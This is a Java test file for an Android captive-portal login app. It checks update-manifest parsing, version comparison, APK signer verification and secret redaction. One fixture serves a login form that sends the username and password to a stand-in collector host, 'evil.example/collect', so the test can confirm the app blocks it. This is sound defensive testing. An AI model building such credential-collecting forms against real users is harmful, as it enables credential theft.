package bot.paradox.wifi;
import java.util.*;import java.net.*;import java.io.*;import com.sun.net.httpserver.*;
/** v5 JVM tests: update manifest parsing (GitHub + simple), version comparison, signer check; cross-host credential guard for GET forms; secret redaction. */
public class UpdTest {
 static int fails=0,passes=0;static void check(boolean ok,String w){System.out.println((ok?"PASS  ":"FAIL  ")+w);if(ok)passes++;else fails++;}
 static String rep(String s,int n){StringBuilder b=new StringBuilder();for(int i=0;i<n;i++)b.append(s);return b.toString();}
 public static void main(String[] a)throws Exception{
  String gh="{\"tag_name\":\"v5.1\",\"name\":\"Paradox Wi-Fi 5.1\",\"draft\":false,\"prerelease\":false,\"html_url\":\"https://github.com/chinmays-tanx09/paradox-wifi/releases/tag/v5.1\",\"body\":\"Faster sign-in on FortiGate\\r\\n- fixes\\r\\nversionCode: 8\\r\\nsha256: "+rep("ab",32)+"\",\"assets\":[{\"name\":\"notes.txt\",\"browser_download_url\":\"https://example.com/n.txt\"},{\"name\":\"Paradox_WiFi_v5.1.apk\",\"browser_download_url\":\"https://github.com/chinmays-tanx09/paradox-wifi/releases/download/v5.1/Paradox_WiFi_v5.1.apk\"}]}";
  Release r=Release.parse(gh);check(r!=null&&r.versionCode==8&&r.versionName.equals("5.1"),"GitHub release: tag v5.1 + 'versionCode: 8' read");
  check(r!=null&&r.apkUrl.endsWith("Paradox_WiFi_v5.1.apk")&&r.sha256.equals(rep("ab",32)),"GitHub release: first .apk asset and published SHA-256 picked");
  check(r!=null&&r.changelog.startsWith("Faster sign-in")&&!r.changelog.contains("versionCode"),"GitHub release: changelog without the machine lines");
  check(r!=null&&r.newerThan(7,"5.0")&&!r.newerThan(8,"5.1")&&!r.newerThan(9,"5.2"),"version compare by versionCode (8 > 7; not > 8 or 9)");
  Release noCode=Release.parse(gh.replace("versionCode: 8",""));check(noCode!=null&&noCode.versionCode==0&&noCode.newerThan(7,"5.0")&&!noCode.newerThan(7,"5.1")&&!noCode.newerThan(7,"5.10"),"no versionCode: dotted name compare (5.1 > 5.0, not > 5.1 / 5.10)");
  check(Release.parse(gh.replace("\"prerelease\":false","\"prerelease\":true"))==null,"pre-releases ignored");
  check(Release.parse(gh.replace("https://github.com/chinmays-tanx09/paradox-wifi/releases/download","http://github.com/x"))==null,"plain-HTTP APK link refused");
  check(Release.parse("{\"message\":\"Not Found\",\"documentation_url\":\"https://docs.github.com\"}")==null,"404 body (repo/release missing) -> no update, no crash");
  Release s=Release.parse("{\"versionCode\":9,\"versionName\":\"5.2\",\"apkUrl\":\"https://host/p.apk\",\"sha256\":\""+rep("CD",32)+"\",\"changelog\":\"Bug fixes\",\"mandatory\":true}");
  check(s!=null&&s.versionCode==9&&s.mandatory&&s.sha256.equals(rep("cd",32))&&s.newerThan(7,"5.0"),"simple manifest schema parsed (mandatory, sha256)");
  check(Release.parse("not json")==null&&Release.parse("")==null,"garbage -> no update");
  Set<String> ours=new HashSet<>(Collections.singletonList("5E:C7:E7:8B")),theirs=new HashSet<>(Collections.singletonList("AA:BB:CC:DD"));
  check(Release.sameSigner(ours,new HashSet<>(ours))&&!Release.sameSigner(ours,theirs)&&!Release.sameSigner(ours,new HashSet<String>())&&!Release.sameSigner(ours,null),"signer check: only the identical certificate set passes (mismatch / unsigned refused)");
  // ---- GET-method login form pointing at another host: nothing may leave ----
  HttpServer srv=HttpServer.create(new InetSocketAddress("127.0.0.1",0),0);int port=srv.getAddress().getPort();
  srv.createContext("/",x->{byte[] b=("<html><form method=GET action='http://evil.example/collect'><input name=user><input type=password name=pw><input type=submit></form></html>").getBytes();x.getResponseHeaders().add("Content-Type","text/html");x.sendResponseHeaders(x.getRequestURI().getPath().equals("/generate_204")?200:200,b.length);x.getResponseBody().write(b);x.close();});srv.start();
  final List<String> hosts=new ArrayList<>();Http h=new Http(u->{hosts.add(u.getHost());if(u.getHost().equals("evil.example"))throw new IOException("contacted evil host");return new URL(u.toString().replace("http://connectivitycheck.gstatic.com","http://127.0.0.1:"+port).replace("http://portal.campus","http://127.0.0.1:"+port)).openConnection();});
  Drivers.Net n=new Drivers.Net();n.type=Portal.GENERIC;n.loginUrl="http://portal.campus/login";n.hosts.add("portal.campus");h.allowedHosts=n.hosts;h.secret="s3cret";
  Exception e=null;try{Drivers.of(n.type).login(h,n,"u","s3cret");}catch(Exception x){e=x;}
  check(e instanceof Http.Blocked&&!hosts.contains("evil.example"),"GET form whose action is another host: blocked before any request ("+(e==null?"no exception":e.getMessage())+")");
  // ---- a portal page echoing the password is redacted in what the app keeps ----
  srv.createContext("/echo",x->{byte[] b="<p class=error>Wrong password s3cret for u</p>".getBytes();x.sendResponseHeaders(200,b.length);x.getResponseBody().write(b);x.close();});
  Http.Resp er=h.get("http://portal.campus/echo");check(!er.body.contains("s3cret")&&er.body.contains("[redacted]"),"a portal page that echoes the password is redacted before the app stores or shows it");
  srv.stop(0);
  System.out.println("\n"+passes+" passed, "+fails+" failed");System.out.println(fails==0?"ALL PASS":"FAILURES: "+fails);System.exit(fails==0?0:1);}
}
